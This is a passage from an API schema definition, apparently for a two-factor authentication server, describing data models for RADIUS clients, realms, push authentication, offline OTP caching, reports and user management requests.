          "type": "string"
        },
        "DisplayInfo": {
          "description": "Various license information to display to user.",
          "$ref": "#/definitions/DisplayInfo"
        },
        "Features": {
          "description": "Product features available in the current license state.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "Deactivated": {
          "description": "Whether the product instance was deactivated on the backend.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "ProductInstanceInfo"
    },
    "ProductVersionState": {
      "properties": {
        "MostRecentVersion": {
          "description": "Most recent available version which could be installed.",
          "type": "string"
        },
        "CurrentInstalledVersion": {
          "description": "Currently installed Authentication Server version (if more Authentication Servers are installed, the latest version is returned).",
          "type": "string"
        },
        "Url": {
          "description": "URL of the installation file of the most recent available version.",
          "type": "string"
        },
        "ChangelogPath": {
          "description": "Changelog for the most recent available version.",
          "type": "string"
        },
        "Status": {
          "description": "Current installation status: 1 - up to date, 2 - out of date.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "ProductVersionState"
    },
    "ProfileParams": {
      "properties": {
        "PhoneNumber": {
          "description": "User's phone number. Is used to send provisioning and OTP messages.",
          "type": "string"
        },
        "Email": {
          "description": "User's email. Can be used to send provisioning and OTP messages.",
          "type": "string"
        },
        "Displayname": {
          "description": "User's display name. Displayed in user list, can be edited.",
          "type": "string"
        },
        "SoftTokenType": {
          "description": "Mobile application token type. Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "ProfileParams"
    },
    "ProvisioningLinkQR": {
      "properties": {
        "Url": {
          "description": "Provisioning link url.",
          "type": "string"
        },
        "QRCode": {
          "description": "QR code with provisioning link, as base64.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ProvisioningLinkQR"
    },
    "PushChallengeAndSyncRes": {
      "properties": {
        "PushChallengeResult": {
          "description": "Result of current authentication.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3
          ]
        },
        "OfflineOtpHashes": {
          "description": "Data to store in offline cache.",
          "$ref": "#/definitions/OfflineOtpHashes"
        },
        "MasterRecoveryKey": {
          "description": "Pre-generated master recovery key to be stored in offline cache.",
          "$ref": "#/definitions/Mrk"
        }
      },
      "type": "object",
      "format": "PushChallengeAndSyncRes"
    },
    "PushChallengeAndSyncResult": {
      "properties": {
        "PushChallengeResult": {
          "description": "Result of current authentication.",
          "$ref": "#/definitions/PushChallengeResult"
        },
        "OfflineOtpHashes": {
          "description": "Data to store in offline cache.",
          "$ref": "#/definitions/OfflineOtpHashes"
        },
        "MasterRecoveryKey": {
          "description": "Pre-generated master recovery key to be stored in offline cache.",
          "$ref": "#/definitions/Mrk"
        },
        "Fido": {
          "description": "FIDO data for offline cache.",
          "$ref": "#/definitions/OfflineFido"
        }
      },
      "type": "object",
      "format": "PushChallengeAndSyncResult"
    },
    "PushChallengeResult": {
      "properties": {
        "Result": {
          "description": "Result of Push authentication. Possible values: 0 - nothing has changed yet (ask again e.g. in one second), 1 - user approved Push, 3 - aborted (do not ask again).",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3
          ]
        },
        "SelfEnrollmentKey": {
          "description": "Key to provide to SelfEnroll.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "PushChallengeResult"
    },
    "RadiusAttributeSettings": {
      "properties": {
        "VendorId": {
          "description": "Vendor ID if it is a vendor-specific attribute. Otherwise null.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "AttributeId": {
          "description": "Attribute ID.",
          "type": "integer",
          "format": "int32"
        },
        "ValueType": {
          "description": "Type of the value: 0 - String, 1 - Integer, 2 - Bytes, 3 - IPv4 address, 4 - IPv6 prefix, 5 - Interface ID.",
          "type": "integer",
          "format": "int32"
        },
        "Source": {
          "description": "Where to obtain value from: 0 - use constant value, 1 - from Active Directory attribute of the user object.",
          "type": "integer",
          "format": "int32"
        },
        "Value": {
          "description": "Constant value or Active Directory attribute name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "RadiusAttributeSettings"
    },
    "RadiusAuthParameters": {
      "properties": {
        "Username": {
          "type": "string"
        },
        "Password": {
          "description": "Password input. Can be e.g. OTP, password+OTP or empty.",
          "type": "string"
        },
        "Realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm_WithAutoRegParams"
        },
        "ProtocolType": {
          "description": "Possible values: 0 - Plaintext, 1 - MS-CHAPv2.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1
          ]
        },
        "EnforceMobileCompound": {
          "description": "Instead of mobile OTP, Password must contain password+OTP (so, include first factor, too). If false, the component has to validate the first factor.",
          "type": "boolean"
        },
        "EnforceHardTokenCompound": {
          "description": "Instead of hard token OTP, Password must contain password+OTP (so, include first factor, too). If false, the component has to validate the first factor.",
          "type": "boolean"
        },
        "Challenge": {
          "description": "Only for MS-CHAPv2.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "MsChapV2Response": {
          "description": "Only for MS-CHAPv2.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "SoftTokenOtpAllowed": {
          "type": "boolean"
        },
        "SoftTokenPushAllowed": {
          "type": "boolean"
        },
        "SmsOtpAllowed": {
          "type": "boolean"
        },
        "RequestSmsOtpAllowed": {
          "description": "Allow the user to enter \"sms\" as a password to obtain SMS. If true, the component has to validate the first factor.",
          "type": "boolean"
        },
        "HardTokenOtpAllowed": {
          "type": "boolean"
        },
        "Non2FactorAllowed": {
          "description": "Allow logging in for users without 2FA.",
          "type": "boolean"
        },
        "AllowedVpnGroup": {
          "description": "If specified, only users from this Active Directory group will be allowed.",
          "type": "string"
        },
        "UserIP": {
          "description": "User's IP address (if can be obtained). Used for whitelisting.",
          "type": "string"
        },
        "SkipFirstFactorValidation": {
          "description": "Set this to true if the component validates first factor (so, ESA does not have to validate it).",
          "type": "boolean"
        },
        "UseRadiusChallenge": {
          "description": "Use two step authentication. First step will validate first factor. Second step will validate second factor. For second step, specify correct CurrentRadiusChallengeRequestsPairingKey obtained from first step.",
          "type": "boolean"
        },
        "CurrentRadiusChallengeRequestsPairingKey": {
          "description": "If UseRadiusChallenge. Specify this for second step. Obtained from result of first step.",
          "type": "string"
        },
        "ComponentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "ClientIdentifier": {
          "description": "Value of the NAS-Identifier RADIUS attribute. Can change ESA RADIUS behavior. Currently, these special values are recognized: challenge_always - always send Radius-Challenge (for user to be able to enter MRK), challenge_if_possible (default) - only send Radius-Challenge if some authentication type requiring it is possible, challenge_if_needed - only send Radius-Challenge if needed for successful authentication, challenge_never - never send Access-Challenge (for clients which cannot present additional prompt).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "RadiusAuthParameters"
    },
    "RadiusClientFilter": {
      "properties": {
        "Name": {
          "description": "Filtering by client name.",
          "type": "string"
        },
        "ClientIp": {
          "description": "Filtering by client IP.",
          "type": "string"
        },
        "ServerId": {
          "description": "Filtering by server ID.",
          "type": "string"
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "RadiusClientFilter"
    },
    "RadiusClientSettings": {
      "properties": {
        "AllowNon2FaUsers": {
          "description": "Allow logging in for users without 2FA.",
          "type": "boolean"
        },
        "Id": {
          "description": "Unique RADIUS client ID.",
          "type": "string"
        },
        "ClientName": {
          "description": "Display name.",
          "type": "string"
        },
        "ClientIp": {
          "description": "Client IP. Only connections from this IP will be allowed.",
          "type": "string"
        },
        "SharedSecret": {
          "description": "RADIUS protocol shared secret (this same secret must be set on the client).",
          "type": "string"
        },
        "AuthSmsIsEnabled": {
          "type": "boolean"
        },
        "RequestSmsIsEnabled": {
          "description": "Allow the user to enter \"sms\" as a password to obtain SMS. If true, the component has to validate the first factor.",
          "type": "boolean"
        },
        "AuthMobileIsEnabled": {
          "type": "boolean"
        },
        "AuthMobilePushIsEnabled": {
          "type": "boolean"
        },
        "AuthHardTokenIsEnabled": {
          "type": "boolean"
        },
        "AuthMobileCompoundIsEnabled": {
          "description": "Instead of mobile OTP, Password must contain password+OTP (so, include first factor, too). If false, the component has to validate the first factor.",
          "type": "boolean"
        },
        "AuthHardTokenCompoundIsEnabled": {
          "description": "Instead of hard token OTP, Password must contain password+OTP (so, include first factor, too). If false, the component has to validate the first factor.",
          "type": "boolean"
        },
        "RestrictVpnAccess": {
          "description": "If to enable the AllowedVpnGroup setting.",
          "type": "boolean"
        },
        "AllowedVpnGroup": {
          "description": "If specified, only users from this Active Directory group will be allowed.",
          "type": "string"
        },
        "SkipFirstFactorValidation": {
          "description": "Set this to true if the component validates first factor (so, ESA does not have to validate it).",
          "type": "boolean"
        },
        "UseRadiusChallenge": {
          "description": "Use two step authentication. First step will validate first factor. Second step will validate second factor.",
          "type": "boolean"
        },
        "RealmMode": {
          "description": "How user realm is obtained. Possible values: 0 - always send current domain (where the RADIUS component runs) as the realm, 1 - always send current domain or recognized domains in trust (according to domain part of user name), 2 - always send the pre-defined realm.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        },
        "Realm": {
          "description": "Realm ID (if RealmMode is 2).",
          "type": "string"
        },
        "Attributes": {
          "description": "Additional attributes to send.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/RadiusAttributeSettings"
          }
        }
      },
      "type": "object",
      "format": "RadiusClientSettings"
    },
    "RadiusClientsResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered radius clients settings",
          "type": "array",
          "items": {
            "$ref": "#/definitions/RadiusClientSettings"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "RadiusClientsResponse"
    },
    "RealmCategoryInfo": {
      "properties": {
        "Category": {
          "description": "Category key.",
          "type": "string"
        },
        "RealmCount": {
          "description": "Count of realms in this category.",
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "RealmCategoryInfo"
    },
    "RealmIdResult": {
      "properties": {
        "RealmId": {
          "description": "Found realm ID.",
          "type": "string"
        },
        "RealmName": {
          "description": "Found realm name.",
          "type": "string"
        },
        "Category": {
          "description": "Found realm category.",
          "type": "string"
        },
        "AllNames": {
          "description": "Possible names of the object represented by this realm. E.g. FQDN and NetBIOS name for AD domain.",
          "type": "array",
          "items": {
            "type": "string"
          }
        }
      },
      "type": "object",
      "format": "RealmIdResult"
    },
    "RealmImportOptions": {
      "properties": {
        "Type": {
          "description": "File type. Possible values: 0 - CSV, 1 - LDF.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1
          ]
        },
        "HasHeader": {
          "description": "If the first line in CSV is the header (column names). If true, UserNameColumn and UserPhoneColumn are column names from the header. Otherwise, they are indexes of the columns.",
          "type": "boolean"
        },
        "Overwrite": {
          "description": "Automatically overwrite users which already exist. If false, ends with an error if the user already exists.",
          "type": "boolean"
        },
        "Delimiter": {
          "description": "CSV column delimiter.",
          "type": "string"
        },
        "UserNameColumn": {
          "description": "User name column name or column index (according to HasHeader option).",
          "type": "string"
        },
        "UserPhoneColumn": {
          "description": "Phone number column name or column index (according to HasHeader option).",
          "type": "string"
        },
        "UserEmailColumn": {
          "description": "Email column name or column index (according to HasHeader option).",
          "type": "string"
        },
        "UserDisplaynameColumn": {
          "description": "Display name column name or column index (according to HasHeader option).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "RealmImportOptions"
    },
    "RealmImportUsersResult": {
      "properties": {
        "ImportedUserCount": {
          "type": "integer",
          "format": "int32"
        },
        "FailedUserCount": {
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "RealmImportUsersResult"
    },
    "RealmInfo": {
      "properties": {
        "Realm": {
          "description": "Basic realm information.",
          "$ref": "#/definitions/UserRealm_WithInfo"
        },
        "OwnsUsers": {
          "description": "If users can be manipulated using CreateUser and DeleteUser. Is false for the default realm in AD mode (because ESA does not own the users - they exist in the Active Directory).",
          "type": "boolean"
        },
        "UserCount": {
          "description": "Count of users in the realm. Returned only if requested.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "SyncType": {
          "description": "Information about realm synchronization for synchronized realms. Possible values: 0 - synchronization not set up, 1 - automatic synchronization disabled, 2 - automatic synchronization enabled.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        },
        "Settings": {
          "description": "Editable realm settings.",
          "$ref": "#/definitions/RealmSettings"
        }
      },
      "type": "object",
      "format": "RealmInfo"
    },
    "RealmSettings": {
      "properties": {
        "NameMode": {
          "description": "Specifies the naming behavior. Possible values: 0 - automatic naming, 1 - AD domain naming.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1
          ]
        },
        "Name_Fqdn": {
          "description": "Fully qualified domain name (for AD domain naming).",
          "type": "string"
        },
        "Name_Netbios": {
          "description": "NetBIOS name (for AD domain naming).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "RealmSettings"
    },
    "RealmSyncParamsExternalOUTree": {
      "properties": {
        "SyncServerGuid": {
          "description": "ID for the external AD/LDAP server.",
          "type": "string"
        },
        "ServerPath": {
          "description": "Server address in the form LDAP://server:port.",
          "type": "string"
        },
        "OrganizationalUnits": {
          "description": "Orgranizational Units of the external AD/LDAP server.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/OrganizationalUnit"
          }
        }
      },
      "type": "object",
      "format": "RealmSyncParamsExternalOUTree"
    },
    "RealmSyncParamsExternalUserList": {
      "properties": {
        "SyncServerGuid": {
          "description": "ID for the external AD/LDAP server.",
          "type": "string"
        },
        "ServerPath": {
          "description": "Server address in the form LDAP://server:port.",
          "type": "string"
        },
        "UserNames": {
          "description": "List of all user names.",
          "type": "array",
          "items": {
            "type": "string"
          }
        }
      },
      "type": "object",
      "format": "RealmSyncParamsExternalUserList"
    },
    "RealmSyncParamsExternalUserUpdate": {
      "properties": {
        "SyncServerGuid": {
          "description": "ID for the external AD/LDAP server.",
          "type": "string"
        },
        "ServerPath": {
          "description": "Server address in the form LDAP://server:port.",
          "type": "string"
        },
        "SyncUsersBatch": {
          "description": "Users in the external AD/LDAP server.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/RealmSyncParamsExternalUserUpdateBatch"
          }
        }
      },
      "type": "object",
      "format": "RealmSyncParamsExternalUserUpdate"
    },
    "RealmSyncParamsExternalUserUpdateBatch": {
      "properties": {
        "DNSuffix": {
          "description": "Distinguished name suffix for all users in SyncUsers.",
          "type": "string"
        },
        "SyncUsers": {
          "description": "Users in the external AD/LDAP server.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UserBasicData"
          }
        }
      },
      "type": "object",
      "format": "RealmSyncParamsExternalUserUpdateBatch"
    },
    "ReportEventUiData": {
      "properties": {
        "Id": {
          "description": "Unique identifier.",
          "type": "string"
        },
        "Time": {
          "description": "Event time (UTC).",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Type": {
          "description": "Event type details.",
          "$ref": "#/definitions/ReportEventUiType"
        },
        "User": {
          "description": "User name (for authentication events).",
          "type": "string"
        },
        "Realm": {
          "description": "User realm ID (for authentication events).",
          "type": "string"
        },
        "ComponentType": {
          "description": "Component type name (for authentication and component events).",
          "type": "string"
        },
        "Component": {
          "description": "Component name (for authentication and component events).",
          "type": "string"
        },
        "Info": {
          "description": "Event details.",
          "type": "string"
        },
        "Company": {
          "description": "Company ID.",
          "type": "string"
        },
        "CompanyName": {
          "description": "Company name.",
          "type": "string"
        },
        "Caller": {
          "description": "Caller name or SID.",
          "type": "string"
        },
        "Result": {
          "description": "Event result (success or failure).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ReportEventUiData"
    },
    "ReportEventUiDataResponse": {
      "properties": {
        "ReportEvents": {
          "description": "Filtered report events",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ReportEventUiData"
          }
        },
        "MaxResultWindow": {
          "description": "Maximum count of possibly returned report events",
          "type": "integer",
          "format": "int32"
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "ReportEventUiDataResponse"
    },
    "ReportEventUiType": {
      "properties": {
        "Name": {
          "description": "Type display name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ReportEventUiType"
    },
    "ReportFilter": {
      "properties": {
        "Types": {
          "description": "Type identifiers.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "TimeFrom": {
          "description": "Start time.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "TimeTo": {
          "description": "End time.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "User": {
          "description": "Part of user name (for authentication events).",
          "type": "string"
        },
        "Realm": {
          "description": "Realm ID.",
          "type": "string"
        },
        "Component": {
          "description": "Part of component type name or component name (for authentication and component events).",
          "type": "string"
        },
        "Caller": {
          "description": "Part of caller name.",
          "type": "string"
        },
        "Info": {
          "description": "Part of info.",
          "type": "string"
        },
        "Result": {
          "description": "Result.",
          "type": "string"
        },
        "Company": {
          "description": "Company.",
          "type": "string"
        },
        "SortField": {
          "description": "Field by which the result should be sorted.",
          "type": "string"
        },
        "SortOrder": {
          "description": "Order for sorting (when there is defined a field for sorting).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ReportFilter"
    },
    "ReportFilterOptions": {
      "properties": {
        "ReportEventTypes": {
          "description": "Report event types",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ReportEventUiType"
          }
        },
        "ReportResultTypes": {
          "description": "Report result types",
          "type": "array",
          "items": {
            "type": "string"
          }
        }
      },
      "type": "object",
      "format": "ReportFilterOptions"
    },
    "ReportGraphDataResponse": {
      "properties": {
        "TimeDataLabels": {
          "description": "Time data labels",
          "type": "array",
          "items": {
            "type": "string",
            "format": "date-time"
          }
        },
        "TimeDataGrouping": {
          "description": "Time data grouping. Possible values: minute, hour, day, month, year",
          "type": "string"
        },
        "TimeDataSets": {
          "description": "Time data sets",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ReportGraphTimeSet"
          }
        },
        "PieDataSets": {
          "description": "Index of last returned report event from filtered result",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ReportGraphResumeSet"
          }
        }
      },
      "type": "object",
      "format": "ReportGraphDataResponse"
    },
    "ReportGraphResumeSet": {
      "properties": {
        "Label": {
          "description": "Event type label",
          "type": "string"
        },
        "Count": {
          "description": "Event type count",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "ReportGraphResumeSet"
    },
    "ReportGraphTimeSet": {
      "properties": {
        "Label": {
          "description": "Event type label",
          "type": "string"
        },
        "Data": {
          "description": "Events count",
          "type": "array",
          "items": {
            "type": "integer",
            "format": "int64"
          }
        }
      },
      "type": "object",
      "format": "ReportGraphTimeSet"
    },
    "ReportsSettings": {
      "properties": {
        "ElasticSearch": {
          "description": "Elasticsearch setting to be used for reports.",
          "$ref": "#/definitions/ElasticSearchSettings"
        }
      },
      "type": "object",
      "format": "ReportsSettings"
    },
    "Request_AccountInitialize": {
      "type": "object",
      "format": "Request_AccountInitialize"
    },
    "Request_AssignHardToken": {
      "properties": {
        "hardTokenSerialNumber": {
          "type": "string"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_AssignHardToken"
    },
    "Request_Authenticate": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "otp": {
          "description": "One time password entered to the OTP field by the user.",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\". Needs to be specified to be able to evaluate MRK.",
          "type": "string"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_Authenticate"
    },
    "Request_AuthenticateAndSync": {
      "properties": {
        "lastUsedOfflineOtps": {
          "description": "Information about authentications made without contacting Authentication Server.",
          "$ref": "#/definitions/LastUsedOfflineOtpHashesWithOffsets"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "otp": {
          "description": "One time password entered to the OTP field by the user.",
          "type": "string"
        },
        "offlineOtpsHashSalt": {
          "description": "Salt used to hash offline OTPs. Use some unique identifier of the user (e.g. SID).",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "isAutoSync": {
          "description": "If this is a postponed authentication done to synchronize offline cache when the component became online.",
          "type": "boolean"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        },
        "offlineFido": {
          "description": "Data required to update FIDO key after using it in offline mode.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/FidoCredential"
          }
        }
      },
      "type": "object",
      "format": "Request_AuthenticateAndSync"
    },
    "Request_AuthenticateRadius": {
      "properties": {
        "ap": {
          "$ref": "#/definitions/RadiusAuthParameters"
        }
      },
      "type": "object",
      "format": "Request_AuthenticateRadius"
    },
    "Request_AutoRegisterUser": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm_WithAutoRegParams"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_AutoRegisterUser"
    },
    "Request_CancelInvitation": {
      "properties": {
        "name": {
          "description": "Invitation display name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CancelInvitation"
    },
    "Request_CancelInvitations_Multiaction2": {
      "properties": {
        "names": {
          "description": "List of invitations display names.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/InvitationName"
          }
        },
        "filter": {
          "$ref": "#/definitions/InvitationFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_CancelInvitations_Multiaction2"
    },
    "Request_CheckPhoneNumber": {
      "properties": {
        "phoneNumber": {
          "description": "Phone number string.",
          "type": "string"
        },
        "twoLetterIsoRegionName": {
          "description": "Optional region name (if not provided, region of Authentication Server will be used). Used for returning of the example number.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CheckPhoneNumber"
    },
    "Request_CheckPushChallenge": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "pushChallengeId": {
          "description": "Obtained from result of StartTwoFactorAuthentication.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CheckPushChallenge"
    },
    "Request_CheckPushChallengeAndSync": {
      "properties": {
        "lastUsedOfflineOtps": {
          "description": "Information about authentications made without contacting Authentication Server.",
          "$ref": "#/definitions/LastUsedOfflineOtpHashesWithOffsets"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "pushChallengeId": {
          "description": "Obtained from result of StartTwoFactorAuthentication.",
          "type": "string"
        },
        "offlineCacheKey": {
          "description": "Returned from StartTwoFactorAuthentication.",
          "type": "string"
        },
        "offlineOtpsHashSalt": {
          "description": "Salt used to hash offline OTPs. Use some unique identifier of the user (e.g. SID).",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CheckPushChallengeAndSync"
    },
    "Request_CheckPushChallengeAndSyncNew": {
      "properties": {
        "lastUsedOfflineOtps": {
          "description": "Information about authentications made without contacting Authentication Server.",
          "$ref": "#/definitions/LastUsedOfflineOtpHashesWithOffsets"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "pushChallengeId": {
          "description": "Obtained from result of StartTwoFactorAuthentication.",
          "type": "string"
        },
        "offlineCacheKey": {
          "description": "Returned from StartTwoFactorAuthentication.",
          "type": "string"
        },
        "offlineOtpsHashSalt": {
          "description": "Salt used to hash offline OTPs. Use some unique identifier of the user (e.g. SID).",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        },
        "offlineFido": {
          "description": "Data required to update FIDO key after using it in offline mode.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/FidoCredential"
          }
        }
      },
      "type": "object",
      "format": "Request_CheckPushChallengeAndSyncNew"
    },
    "Request_CheckPushChallengeNew": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "pushChallengeId": {
          "description": "Obtained from result of StartTwoFactorAuthentication.",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_CheckPushChallengeNew"
    },
    "Request_CreateApiCredentials": {
      "properties": {
        "credentialsName": {
          "description": "Display name of API credentials.",
          "type": "string"
        },
        "enableAuthApi": {
          "description": "If these credentials can be used to call the authentication API (/auth).",
          "type": "boolean"
        },
        "enableManagementApi": {
          "description": "If these credentials can be used to call the management API (/manage).",
          "type": "boolean"
        },
        "enableSynchronizationApi": {
          "description": "If these credentials can be used to call the synchronization API (/sync).",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_CreateApiCredentials"
    },
    "Request_CreateIdentityProviderConfiguration": {
      "properties": {
        "configuration": {
          "description": "Identity Provider configuration settings.",
          "$ref": "#/definitions/IdentityProviderConfiguration"
        },
        "componentKey": {
          "description": "Component key of the Identity Provider server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CreateIdentityProviderConfiguration"
    },
    "Request_CreateInvitation": {
      "properties": {
        "name": {
          "description": "Invitation display name.",
          "type": "string"
        },
        "expires": {
          "description": "Expiration time.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "maxUsages": {
          "description": "How many times the invitation can be used. The same invitation can be used for multiple components.",
          "type": "number",
          "format": "uint32"
        },
        "permissions": {
          "description": "Permissions for the invitation.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            4,
            7
          ]
        }
      },
      "type": "object",
      "format": "Request_CreateInvitation"
    },
    "Request_CreateRadiusClient": {
      "properties": {
        "client": {
          "description": "RADIUS client settings. if this parameter is null, an empty (default) RADIUS client will be created.",
          "$ref": "#/definitions/RadiusClientSettings"
        },
        "componentKey": {
          "description": "Component key of the RADIUS server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CreateRadiusClient"
    },
    "Request_CreateRealm": {
      "properties": {
        "realm": {
          "description": "Realm parameters.",
          "$ref": "#/definitions/UserRealm_WithRegParams"
        }
      },
      "type": "object",
      "format": "Request_CreateRealm"
    },
    "Request_CreateUser": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "phone": {
          "description": "User's phone number. Is used to send provisioning and OTP messages.",
          "type": "string"
        },
        "email": {
          "description": "User's email. Can be used to send provisioning and OTP messages.",
          "type": "string"
        },
        "displayname": {
          "description": "User's display name. Displayed in user list, can be edited.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_CreateUser"
    },
    "Request_CreateUserSelection": {
